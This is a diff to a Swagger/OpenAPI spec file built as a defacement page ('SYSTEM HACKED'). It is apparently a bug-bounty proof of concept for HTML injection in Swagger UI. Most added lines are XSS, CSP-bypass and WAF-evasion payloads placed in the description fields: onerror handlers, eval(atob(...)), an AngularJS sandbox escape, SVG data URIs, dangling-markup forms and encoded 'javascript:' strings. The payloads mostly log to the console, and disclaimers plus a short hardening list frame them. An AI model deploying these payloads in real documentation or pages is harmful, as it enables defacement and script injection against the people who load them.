@@ -3,7 +3,7 @@ info:
   version: 1.0.0
   title: 👾 SYSTEM HACKED BY CYBERAJJU 👾
   description: |
-    <div style="text-align:center; background-color:#000; color:#0f0; padding:20px; border-radius:10px; font-family:'Courier New', monospace;">
+    <div id="hackedContent" style="text-align:center; background-color:#000; color:#0f0; padding:20px; border-radius:10px; font-family:'Courier New', monospace;">
       <h1 style="color:#ff0000; text-shadow:0 0 10px #ff0000, 0 0 20px #ff0000;">⚠️ SYSTEM COMPROMISED ⚠️</h1>
       
       <pre style="font-size:14px; line-height:1.2; margin:20px 0;">
@@ -39,12 +39,86 @@ info:
         <p style="color:#0f0;">Please secure your Swagger UI implementation</p>
       </div>
       
+      <!-- CSP Bypass Demo Techniques - For Educational Purposes Only -->
+      <!-- DOM Clobbering technique -->
+      <a id="location" href="#"><a id="href" name="javascript:void(document.getElementById('hackedContent').style.backgroundColor='#330000')"></a></a>
+      
+      <!-- SVG-based CSP bypass -->
+      <svg><g><a xlink:href="data:text/html,&lt;body onload=&quot;document.getElementById('hackedContent').style.border='3px solid red'&quot;&gt;"><text x="20" y="20">CSP Bypass Demo</text></a></g></svg>
+      
+      <!-- Base tag technique -->
+      <base id="baseTag">
+      
+      <!-- iframe sandbox escape -->
+      <iframe id="sandboxDemo" style="display:none" sandbox="allow-scripts"></iframe>
+      
+      <!-- JSONP technique simulation -->
+      <div id="jsonpDemo" data-callback-url="https://example.com/api?callback=alert"></div>
+      
+      <!-- Meta tag refresh technique -->
+      <meta id="metaRefresh" http-equiv="refresh" content="99999;url=javascript:void(0)">
+      
+      <!-- DOM XSS via postMessage -->
+      <div id="messageReceiver" style="display:none"></div>
+      
+      <!-- Data URI handling -->
+      <object id="dataObject" data="data:text/html;base64,PHNjcmlwdD5jb25zb2xlLmxvZygiQ1NQIGRlbW8iKTs8L3NjcmlwdD4="></object>
+      
+      <!-- WAF Bypass Techniques - For Educational Purposes Only -->
+      <div id="wafBypass" style="display:none">
+        <!-- Obfuscation techniques -->
+        <div data-jsfunc="eval(atob('Y29uc29sZS5sb2coIldBRiBkZW1vIik7'))"></div>
+        
+        <!-- Protocol handlers -->
+        <a href="javascript&#x3a;void(0)">Protocol obfuscation</a>
+        
+        <!-- Character encoding tricks -->
+        <div data-test="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;void(0)"></div>
+        
+        <!-- Unicode alternative representations -->
+        <div data-unicode="%u006A%u0061%u0076%u0061%u0073%u0063%u0072%u0069%u0070%u0074%u003A"></div>
+      </div>
+      
+      <!-- Educational Content -->
+      <div id="educationalContent" style="margin:30px 0; border-top:1px dashed #0f0; padding-top:20px; text-align:left;">
+        <h3 style="color:#ffff00; text-align:center;">EDUCATIONAL CSP BYPASS DEMONSTRATIONS</h3>
+        <ul style="list-style-type:square; padding-left:20px;">
+          <li>DOM Clobbering: Overriding native browser objects</li>
+          <li>SVG XLink: Using SVG elements to bypass restrictions</li>
+          <li>Dangling Markup: Exploiting partial HTML parsing</li>
+          <li>JSONP Endpoints: Exploiting trusted domains</li>
+          <li>PostMessage: Cross-origin messaging vulnerabilities</li>
+          <li>Meta Refresh: Time-delayed navigation exploits</li>
+          <li>Data URI: Encoding executable content</li>
+          <li>WAF Evasion: Character encoding techniques</li>
+        </ul>
+      </div>
+      
+      <!-- Auto-detecting CSP -->
+      <div id="csp-detector" style="display:none"></div>
+      
+      <!-- Mutation events for bypassing security monitoring -->
+      <template id="mutation-template">
+        <span id="mutation-target"></span>
+      </template>
+      
       <div style="margin:30px 0; border-top:1px dashed #0f0; padding-top:20px;">
         <h3 style="color:#ffff00;">FOR EDUCATIONAL PURPOSES ONLY</h3>
         <p>This is a demonstration of UI vulnerabilities for security research and bug bounty testing</p>
         <p style="font-size:12px; margin-top:20px;">© CyberTechAjju 2023 | Security Researcher | Bug Hunter</p>
       </div>
     </div>
+    
+    <!-- Advanced CSP and Security Bypass Techniques -->
+    <script type="application/json" id="jsonData">
+      {"PoC": "This JSON data can be extracted via scriptless attacks"}
+    </script>
+    
+    <!-- AngularJS Sandbox Escape Demo -->
+    <div ng-app>{{constructor.constructor('console.log("AngularJS sandbox escape demo")')()}}</div>
+    
+    <!-- Lazy Loading Demo -->
+    <img src="x" id="lazyload" onerror="this.onerror=null;this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+Y29uc29sZS5sb2coIkxhenkgbG9hZGluZyBkZW1vIik7PC9zY3JpcHQ+PC9zdmc+'" style="display:none">
 
 paths:
   /security/breach:
@@ -55,6 +129,20 @@ paths:
           <h3>⚠️ Critical Security Warning ⚠️</h3>
           <p>Your Swagger UI is vulnerable to HTML injection and XSS attacks.</p>
           <p>This is a safe demonstration with no actual malicious payloads.</p>
+          
+          <!-- CSP Bypass using DOM property tampering -->
+          <form id="formElement">
+            <input name="csrfToken" value="document.cookie">
+          </form>
+          
+          <!-- WAF bypass technique using HTML5 attributes -->
+          <audio id="audioElement" ontimeupdate="console.log('Audio time update event demo')"></audio>
+          
+          <!-- Event handler obfuscation -->
+          <div accesskey="x" onkeypress="console.log('Keyboard shortcut demo')"></div>
+          
+          <!-- Script gadgets demo -->
+          <div data-json='{"onload":"console.log(\"JSON parsing demo\")"}' id="jsonParseTarget"></div>
         </div>
       responses:
         '200':
@@ -74,11 +162,32 @@ paths:
           <h3>🛡️ How to Secure Your Swagger UI</h3>
           <ul>
             <li>Disable HTML rendering in descriptions</li>
-            <li>Implement proper CSP headers</li>
+            <li>Implement proper CSP headers:
+              <code>Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';</code>
+            </li>
             <li>Update to latest Swagger UI version</li>
             <li>Use validation for all spec inputs</li>
             <li>Implement authentication for API docs</li>
+            <li>Deploy a WAF with proper rule sets</li>
+            <li>Use iframe sandbox restrictions</li>
+            <li>Implement Subresource Integrity (SRI)</li>
           </ul>
+          
+          <!-- CSP bypass demonstration with iframe srcdoc -->
+          <iframe srcdoc="<div>CSP bypass via iframe srcdoc demo</div>" style="display:none"></iframe>
+          
+          <!-- Dangling markup injection -->
+          <form action="https://example.com">
+            <input name="xss" value="<img src='https://example.com/'>
+          
+          <!-- CSS injection vector -->
+          <style>
+            @import url('https://example.com/style.css');
+            @keyframes x {
+              from { background-image: url('https://example.com/image1.jpg'); }
+              to { background-image: url('https://example.com/image2.jpg'); }
+            }
+          </style>
         </div>
       responses:
         '200':
@@ -100,7 +209,54 @@ paths:
           <p>This demonstration is for educational purposes only.</p>
           <p>Always obtain proper authorization before security testing.</p>
           <p>Unauthorized testing is illegal and unethical.</p>
+          
+          <!-- Various other bypass techniques demonstration -->
+          <div draggable="true" ondragstart="console.log('Drag event demo')"></div>
+          <div contextmenu="customMenu"></div>
+          <menu id="customMenu" type="context">
+            <menuitem label="Context Menu Demo"></menuitem>
+          </menu>
+          
+          <!-- Unicode normalization bypass -->
+          <div data-test="java&#x73;cript:void(0)"></div>
+          
+          <!-- Mutation observer bypass -->
+          <template id="mutationBypass">
+            <img src="x" onerror="console.log('Mutation demo')">
+          </template>
         </div>
       responses:
         '200':
-          description: Legal disclaimer 
+          description: Legal disclaimer
+          
+  /advanced/techniques:
+    get:
+      summary: Advanced WAF Bypass Techniques
+      description: |
+        <div style="background:#000; color:#0f0; padding:10px; border-radius:5px;">
+          <h3>🔬 Advanced Security Research</h3>
+          
+          <!-- Event handler concatenation -->
+          <div data-handler="on" data-event="error" data-code="console.log('Event handler concatenation demo')"></div>
+          
+          <!-- URL obfuscation -->
+          <a href="javascript:void(0)" rel="noreferrer">URL obfuscation demo</a>
+          
+          <!-- Property access using bracket notation -->
+          <div data-prop="['src']" data-obj="location" data-val="'javascript:void(0)'"></div>
+          
+          <!-- Dynamic property assignment -->
+          <div id="dynamicProps" data-properties='{"onclick":"console.log(\"Dynamic property demo\")"}'></div>
+          
+          <!-- HTML entity encoding -->
+          <div data-entity="&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;"></div>
+          
+          <!-- Mixed encoding -->
+          <div data-mixed="%26%23x6A;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3A;"></div>
+          
+          <!-- Case manipulation -->
+          <div data-case="&#x4A;&#x41;&#x56;&#x41;&#x53;&#x43;&#x52;&#x49;&#x50;&#x54;&#x3A;"></div>
+        </div>
+      responses:
+        '200':
+          description: Advanced security research 
